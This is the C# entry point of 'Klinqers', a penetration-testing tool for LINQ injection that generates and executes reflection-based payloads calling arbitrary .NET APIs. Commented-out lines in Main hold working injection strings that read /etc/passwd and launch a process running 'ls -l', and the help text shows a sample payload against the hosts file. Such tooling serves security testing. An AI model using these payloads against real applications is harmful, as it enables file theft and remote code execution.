using System;
using System.Collections.Generic;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;

namespace klinqers
{
    class MainClass
    {


        static void printHelp()
        {
            Console.WriteLine("\r\n [Klinqers] an app for testing Linq-injections (License GPL 2.0 - James Dickson 2021)\r\n");

            Console.WriteLine("--assemblies           Creating list for all assemblies in appdomain");
            Console.WriteLine("--type <typename>      Creating list for specific type");
            Console.WriteLine("--call <systemcall>    Create an injectable command for the API-call");
            Console.WriteLine("--test                 Execute the previously created injectable API-call BEWARE!!! this executes the call!!!");
            Console.WriteLine("--test-exec <csharp>   Compile and execute the csharp-code (must return a value and be a single call)");

            Console.WriteLine("\r\n");

            Console.WriteLine("Example:\r\n");
            Console.WriteLine("Example 1 - create an injectable code");
            Console.WriteLine("klinqers.exe --call \"System.IO.File.Exists(c:/windows/system32/drivers/etc/hosts)\"");

            Console.WriteLine("\r\n");
            Console.WriteLine("\r\n");
        }

        public static void Main(string[] args)
        {
            //"c:/windows/system32/hosts".Split(";".ToCharArray())
            //"".GetType().Assembly.GetType("System.IO.File").GetMethods()[29].Invoke(null, new object[] { }).ToString();

            //object obj = "".GetType().Assembly.GetType("System.IO.File").GetMethods()[29].Invoke(null, "/etc/passwd".Split(";".ToCharArray())).ToString();

            //object obj = "".GetType().Assembly.GetType("System.AppDomain").GetMethods()[18].Invoke("".GetType().Assembly.GetType("System.AppDomain").GetProperty("CurrentDomain").GetValue(null), "System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;System.Diagnostics.Process".Split(";".ToCharArray())).GetType().GetMethods()[44].Invoke(null, "ls;-l".Split(";".ToCharArray()));

            if(args.Length < 1)
            {
                printHelp();
                return;
            }

            string strCurrentCall = null;

            for (int i = 0; i < args.Length; i++)
            {
                if (args[i] == "--assemblies")
                {
                    Console.WriteLine("[+] Creating list for all assemblies in appdomain");
                   
                    Klinqers.printAssemblies();
                }
                else if (args[i] == "--help")
                {
                    printHelp();
                    return;
                }
                else if (args[i] == "--test")
                {
                    if (strCurrentCall == null)
                    {
                        Console.WriteLine("[-] Error: no compiled call available and no point in calling null");
                        return;
                    }
                    Console.WriteLine("[+] Executing " + strCurrentCall);

                    Klinqers.executeCSharp(strCurrentCall);
                }
                else if ((i + 1) < args.Length)
                {
                    if (args[i] == "--type")
                    {
                        string strType = args[++i];

                        Console.WriteLine("[+] Creating list for " + strType);

                        Type type = Type.GetType(strType);

                        Klinqers.printMethodsForType(type);
                    }
                    else if (args[i] == "--call")
                    {
                        string strCall = args[++i];

                        Console.WriteLine("[+] Creating call for " + strCall);

                        string strCompiled = Klinqers.getCall(strCall);

                        if (strCompiled != null)
                        {
                            Console.ForegroundColor = ConsoleColor.Red;

                            Console.WriteLine("\r\n[+] ----------- Injectable Code -- ---------------\r\n");
                            Console.WriteLine(strCompiled);
                            Console.WriteLine("\r\n[+] ----------- ----------------------------------\r\n");

                            Console.ResetColor();
                            //Console.ForegroundColor = color;
                        }

                        strCurrentCall = strCompiled;
                    }
                    else if (args[i] == "--test-exec")
                    {
                        string strCall = args[++i];

                        Console.WriteLine("[+] Executing " + strCall);

                        Klinqers.executeCSharp(strCall);
                    }

                }
            }
        }




    }
}
